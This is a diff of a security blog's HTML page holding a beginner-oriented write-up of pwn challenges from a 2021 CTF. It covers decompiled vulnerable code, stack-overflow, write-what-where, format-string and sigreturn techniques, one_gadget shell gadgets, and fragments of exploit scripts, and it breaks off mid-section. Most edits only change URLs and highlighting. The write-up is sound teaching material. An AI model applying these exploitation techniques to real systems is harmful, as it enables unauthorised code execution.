@@ -7,9 +7,9 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.95.0" />
+<meta name="generator" content="Hugo 0.108.0">
 
-<link rel="canonical" href="https://thalium.github.io/blog/posts/apocalypse2021-pwn/">
+<link rel="canonical" href="https://blog.thalium.re/posts/apocalypse2021-pwn/">
 <meta property="og:title" content="Cyber Apocalypse 2021 1/5 - PWN challenges" />
 <meta property="og:description" content="Thalium participated in the Cyber Apocalypse 2021 CTF organized last week by HackTheBox.
 It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
@@ -21,10 +21,9 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 
 This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://thalium.github.io/blog/posts/apocalypse2021-pwn/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://blog.thalium.re/posts/apocalypse2021-pwn/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-04-28T12:00:00+01:00" />
 <meta property="article:modified_time" content="2021-04-28T12:00:00+01:00" />
-
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Cyber Apocalypse 2021 1/5 - PWN challenges"/>
@@ -50,16 +49,16 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 
 This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:"><meta itemprop="datePublished" content="2021-04-28T12:00:00+01:00" />
 <meta itemprop="dateModified" content="2021-04-28T12:00:00+01:00" />
-<meta itemprop="wordCount" content="4352">
+<meta itemprop="wordCount" content="4353">
 <meta itemprop="keywords" content="CTF,Writeup,CyberApocalypse2021," />
 
-<link rel="stylesheet" href="https://thalium.github.io/blog/css/layout.css" />
+<link rel="stylesheet" href="https://blog.thalium.re/css/layout.css" />
 
 
-<link rel="stylesheet" href="https://thalium.github.io/blog/css/default-dark.css" />
+<link rel="stylesheet" href="https://blog.thalium.re/css/default-dark.css" />
 
 
-<link rel="icon" href="https://thalium.github.io/blog/favicon.ico" />
+<link rel="icon" href="https://blog.thalium.re/favicon.ico" />
 
 
 <script type="application/javascript">
@@ -130,19 +129,19 @@ if (!doNotTrack) {
 
   <nav>
     <div class="siteTitle">
-      <a href="https://thalium.github.io/blog/">
-        <img src="https://thalium.github.io/blog/shard_only_no_background.png" width=12%></img>
+      <a href="https://blog.thalium.re/">
+        <img src="https://blog.thalium.re/shard_only_no_background.png" width=12%></img>
         <span>THALIUM</span>
       </a>
     </div> 
 
     
     
-    <a class="nav-item" href="https://thalium.github.io/blog/posts/"><div class="nav-item-title">Posts</div></a>
+    <a class="nav-item" href="https://blog.thalium.re/posts/"><div class="nav-item-title">Posts</div></a>
     
-    <a class="nav-item" href="https://thalium.github.io/blog/joinus/"><div class="nav-item-title">Join Us</div></a>
+    <a class="nav-item" href="https://blog.thalium.re/joinus/"><div class="nav-item-title">Join Us</div></a>
     
-    <a class="nav-item" href="https://thalium.github.io/blog/about/"><div class="nav-item-title">About</div></a>
+    <a class="nav-item" href="https://blog.thalium.re/about/"><div class="nav-item-title">About</div></a>
     
 
   </nav>
@@ -181,8 +180,8 @@ if (!doNotTrack) {
 It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
 Our team finished in fifth place and solved sixty out of the sixty-two challenges:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-scoreboard.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-scoreboard.png" alt="fig_scoreboard">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-scoreboard.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-scoreboard.png" alt="fig_scoreboard">
   </a>
 </p>
 <p>This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:</p>
@@ -199,10 +198,10 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 </ul>
 <p>We also publish our solutions to some challenges in other categories:</p>
 <ul>
-<li><a href="https://thalium.github.io/blog/posts/apocalypse2021-wii-phit/">Wii-Phit</a>: crypto, solved by 38 teams</li>
-<li><a href="https://thalium.github.io/blog/posts/apocalypse2021-off-the-grid/">Off-the-grid</a>: hardware, solved by 99 teams</li>
-<li><a href="https://thalium.github.io/blog/posts/apocalypse2021-discovery/">Discovery</a>: hardware, solved by 17 teams</li>
-<li><a href="https://thalium.github.io/blog/posts/apocalypse2021-artillery/">Artillery</a>: web, solved by 45 teams</li>
+<li><a href="https://blog.thalium.re/posts/apocalypse2021-wii-phit/">Wii-Phit</a>: crypto, solved by 38 teams</li>
+<li><a href="https://blog.thalium.re/posts/apocalypse2021-off-the-grid/">Off-the-grid</a>: hardware, solved by 99 teams</li>
+<li><a href="https://blog.thalium.re/posts/apocalypse2021-discovery/">Discovery</a>: hardware, solved by 17 teams</li>
+<li><a href="https://blog.thalium.re/posts/apocalypse2021-artillery/">Artillery</a>: web, solved by 45 teams</li>
 </ul>
 <h2 id="tooling">Tooling</h2>
 <p>For tooling we used:</p>
@@ -232,7 +231,7 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python script.py ./my_binary -d
 </span></span></code></pre></div><p>The most important thing is to run the binary with the target versions of dynamic linker and c runtime library. To ensure this:</p>
 <ul>
-<li>Download the <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/ld-linux-x86-64.so.zip">ld binary</a> provided</li>
+<li>Download the <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/ld-linux-x86-64.so.zip">ld binary</a> provided</li>
 <li>Copy the ld binary inside your library path and rename it <code>ld-2.27.so</code></li>
 <li>Copy the libc provided by the challenge and rename it <code>libc-2.27.so</code></li>
 <li>Run the script whith the following parameters</li>
@@ -242,11 +241,11 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 <p>Finally, to use the exploit against the remote infrastructure:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python script.py ./environment -libc 2.27 -r <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 
 </span></span></code></pre></div><h2 id="controller---difficulty-14">Controller - Difficulty 1/4</h2>
-<p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_controller.zip">pwn_controller.zip</a></em></p>
+<p><em>Challenge files: <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/pwn_controller.zip">pwn_controller.zip</a></em></p>
 <p><code>Controller</code> is a <strong>64 bits ELF</strong>, which asks the user to choose a simple arithmetic operation and enter two operands. Numbers provided cannot be greater than 69.</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller.png" alt="fig_controller">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller.png" alt="fig_controller">
   </a>
 </p>
 <h3 id="attack-method">Attack method</h3>
@@ -257,19 +256,19 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">28</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> calc_value; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>  calc_value <span style="color:#f92672">=</span> calc();
+</span></span><span style="display:flex;"><span>  calc_value <span style="color:#f92672">=</span> <span style="color:#a6e22e">calc</span>();
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( calc_value <span style="color:#f92672">!=</span> <span style="color:#ae81ff">65338</span> )
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> calculator(a1);
-</span></span><span style="display:flex;"><span>  printstr(<span style="color:#e6db74">&#34;Something odd happened!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Do you want to report the problem?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, buff);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">calculator</span>(a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;Something odd happened!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Do you want to report the problem?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, buff);
 </span></span><span style="display:flex;"><span>  [...]
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>If the operation result is <strong>65338</strong>, we may access a juicy scanf that will overflow the stack buffer <code>buff</code>.</p>
 <h4 id="found-a-way-to-access-to-the-scanf">Found a way to access to the scanf</h4>
 <p>We notice that the calculation is done with <strong>signed int</strong> but the result is stored inside an <strong>unsigned int</strong> into the function <code>calc</code>. After a few tries we found that <code>66 * -3</code> results in the target value.</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_calc.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_calc.png" alt="fig_controller_good_calculation">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller_calc.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller_calc.png" alt="fig_controller_good_calculation">
   </a>
 </p>
 <h4 id="exploit-the-stack-overflow-with-scanf">Exploit the stack overflow with scanf</h4>
@@ -281,24 +280,24 @@ Our team finished in fifth place and solved sixty out of the sixty-two challenge
 </span></span><span style="display:flex;"><span>    NX:       NX enabled
 </span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>No PIE and No canary found: we will build a ropchain. There is no magic / hidden function inside the binary, so we use <code>one_gadget</code> to list available automatic shell gadgets and their constraints:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x4f3d5</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>, environ)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x4f3d5</span> <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>, environ)
 </span></span><span style="display:flex;"><span>constraints:
 </span></span><span style="display:flex;"><span>  rsp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
 </span></span><span style="display:flex;"><span>  rcx <span style="color:#f92672">==</span> NULL
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x4f432</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>, environ)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x4f432</span> <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>, environ)
 </span></span><span style="display:flex;"><span>constraints:
 </span></span><span style="display:flex;"><span>  [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>] <span style="color:#f92672">==</span> NULL
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10a41c</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span>, environ)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10a41c</span> <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span>, environ)
 </span></span><span style="display:flex;"><span>constraints:
 </span></span><span style="display:flex;"><span>  [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span>] <span style="color:#f92672">==</span> NULL
 </span></span></code></pre></div><p>A new problem arises. We have only one scanf to send our payload to leak the libc base address and jump to the one gadget.
 The solution here is to call again scanf with the ROP payload, to calculate the one gadget address and put it somewhere into the binary.
 The ROP payload will then call this address.</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_exploit.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_exploit.png" alt="fig_controller_exploit_schema">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller_exploit.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller_exploit.png" alt="fig_controller_exploit_schema">
   </a>
 </p>
 <h3 id="exploitation">Exploitation</h3>
@@ -445,31 +444,31 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><p>We get a shell :):</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_shell.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-controller_shell.png" alt="fig_controller_shell">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller_shell.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-controller_shell.png" alt="fig_controller_shell">
   </a>
 </p>
 <h2 id="minefield---difficulty-14">Minefield - Difficulty 1/4</h2>
-<p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_mindfield.zip">pwn_mindfield.zip</a></em></p>
+<p><em>Challenge files: <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/pwn_mindfield.zip">pwn_mindfield.zip</a></em></p>
 <p><code>Minefield</code> is a <strong>64 bits ELF</strong> that asks questions to the user to plant a mine:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-minefield.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-minefield.png" alt="fig_controller_minefield">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-minefield.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-minefield.png" alt="fig_controller_minefield">
   </a>
 </p>
 <h3 id="attack-method-1">Attack method</h3>
 <p>This challenge is a very basic one. The inputs <strong>type</strong> and <strong>location</strong> allow to write something at a controlled address:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;Insert type of mine: &#34;</span>);
-</span></span><span style="display:flex;"><span>r(nptr);
-</span></span><span style="display:flex;"><span>target_addr <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)strtoull(nptr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;Insert location to plant: &#34;</span>);
-</span></span><span style="display:flex;"><span>r(target_value);
-</span></span><span style="display:flex;"><span>puts(<span style="color:#e6db74">&#34;We need to get out of here as soon as possible. Run!&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>target_addr <span style="color:#f92672">=</span> strtoull(target_value, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Insert type of mine: &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span>(nptr);
+</span></span><span style="display:flex;"><span>target_addr <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(nptr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Insert location to plant: &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span>(target_value);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;We need to get out of here as soon as possible. Run!&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>target_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoull</span>(target_value, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
 </span></span></code></pre></div><p>We do not have the libc for this challenge but we have a win function named <code>_</code> at address <code>0x40096B</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v0 <span style="color:#f92672">=</span> strlen(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v0);
-</span></span><span style="display:flex;"><span>system(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Mission accomplished! ✔</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v0);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat flag*&#34;</span>);
 </span></span></code></pre></div><p>Note that the same write-what-where vulnerability is used in the challenge <a href="#save-the-environment---difficulty-24">Save the environment</a>.</p>
 <h3 id="exploitation-1">Exploitation</h3>
 <p>Protections are as follow:</p>
@@ -483,12 +482,12 @@ The ROP payload will then call this address.</p>
 <p>We have all elements but it remains to know what to overwrite to win. We choose to overwrite the function pointer present in the <code>.fini_array</code> section. This function pointer is called at the end of the execution. This pointer is at address <code>0x601078</code>.</p>
 <p>Finally the exploit is really simple:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png" alt="fig_controller_minefield">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-minefield_exploit.png" alt="fig_controller_minefield">
   </a>
 </p>
 <h2 id="system-drop---difficulty-14">System dROP - Difficulty 1/4</h2>
-<p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_system_drop.zip">pwn_system_drop.zip</a></em></p>
+<p><em>Challenge files: <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/pwn_system_drop.zip">pwn_system_drop.zip</a></em></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/user/Apocalypse/system-drop/system_drop&#39;</span>
 </span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
 </span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
@@ -501,8 +500,8 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>  alarm(<span style="color:#ae81ff">0xFu</span>);
-</span></span><span style="display:flex;"><span>  read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x100uLL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alarm</span>(<span style="color:#ae81ff">0xFu</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x100uLL</span>);
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>A stack overflow, clear and simple.</p>
@@ -558,13 +557,13 @@ The ROP payload will then call this address.</p>
 </code></pre><p>The function at <code>0x400537</code> is a gift ! We have a raw syscall instruction. However, to have control over the syscall, we first need to control <code>rax</code>, and no gadget allows us to control <code>rax</code> trivially, apart from <code>0x400569</code> which allows to set <code>eax=1</code>.</p>
 <p><code>sigreturn</code> is a nice system call in this case, which will read cpu context from the stack, consequently allowing us to control all the registers. The syscall number associated with it is <code>0xf</code>. So we are looking at setting <code>eax=0xf</code>.</p>
 <p>Reading the alarm manpage is rather interesting:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ALARM(<span style="color:#ae81ff">2</span>)                   Linux Programmer<span style="color:#960050;background-color:#1e0010">&#39;</span>s Manual                  ALARM(<span style="color:#ae81ff">2</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">ALARM</span>(<span style="color:#ae81ff">2</span>)                   Linux Programmer<span style="color:#960050;background-color:#1e0010">&#39;</span>s Manual                  <span style="color:#a6e22e">ALARM</span>(<span style="color:#ae81ff">2</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>NAME
 </span></span><span style="display:flex;"><span>       alarm <span style="color:#f92672">-</span> set an alarm clock <span style="color:#66d9ef">for</span> delivery of a signal
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>RETURN VALUE
-</span></span><span style="display:flex;"><span>       alarm() returns the number of seconds remaining  until  any  previously
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">alarm</span>() returns the number of seconds remaining  until  any  previously
 </span></span><span style="display:flex;"><span>       scheduled alarm was due to be delivered, or zero <span style="color:#66d9ef">if</span> there was no previ<span style="color:#960050;background-color:#1e0010">‐</span>
 </span></span><span style="display:flex;"><span>       ously scheduled alarm.
 </span></span><span style="display:flex;"><span>...
@@ -620,16 +619,16 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><p>The magic shell is coming:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-system_drop_win.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-system_drop_win.png" alt="fig_system_drop_win">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-system_drop_win.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-system_drop_win.png" alt="fig_system_drop_win">
   </a>
 </p>
 <h2 id="harvester---difficulty-24">Harvester - Difficulty 2/4</h2>
-<p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_harvester.zip">pwn_harvester.zip</a></em></p>
+<p><em>Challenge files: <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/pwn_harvester.zip">pwn_harvester.zip</a></em></p>
 <p>The <code>harvester</code> is a 64bits ELF that allows to perform some actions:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-harvester.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-harvester.png" alt="fig_harvester">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-harvester.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-harvester.png" alt="fig_harvester">
   </a>
 </p>
 <p>The libc used by the binary is provided with this challenge.</p>
@@ -643,11 +642,11 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>    PIE:      PIE enabled
 </span></span></code></pre></div><h4 id="harvest-information-required-to-bypass-aslr-and-stack-cookie">Harvest information required to bypass ASLR and stack cookie</h4>
 <p>We will use the format string vulnerability in <code>fight</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Choose weapon:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[1] 🗡</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[2] 💣</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[3] 🏹</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[4] 🔫</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, weapon, <span style="color:#ae81ff">5uLL</span>);
-</span></span><span style="display:flex;"><span>printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Your choice is: &#34;</span>); 
-</span></span><span style="display:flex;"><span>printf((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)weapon);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Choose weapon:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[1] 🗡</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[2] 💣</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[3] 🏹</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">[4] 🔫</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, weapon, <span style="color:#ae81ff">5uLL</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Your choice is: &#34;</span>); 
